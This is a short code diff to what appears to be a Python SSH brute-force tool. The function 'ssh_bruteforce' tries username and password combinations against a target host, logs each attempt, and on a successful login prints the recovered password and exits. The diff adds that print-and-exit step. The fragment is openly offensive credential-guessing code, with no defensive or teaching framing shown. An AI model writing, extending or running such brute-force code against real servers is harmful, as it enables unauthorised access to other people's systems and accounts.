@@ -83,6 +83,8 @@ async def ssh_bruteforce(hostname, username, password, port, found_flag):
         async with asyncssh.connect(host=hostname, username=username, password=password) as conn:
             found_flag.set()
             print(f"{bold}{random_color}[{port}] [ssh] host:{hostname}  login:{username}  password:{password}")
+            print(f"Password is: {password}")
+            sys.exit()
 
     except Exception as err:
         print(f"{bold}{random_color}[Attempt] target {hostname} - login:{username} - password:{password}")
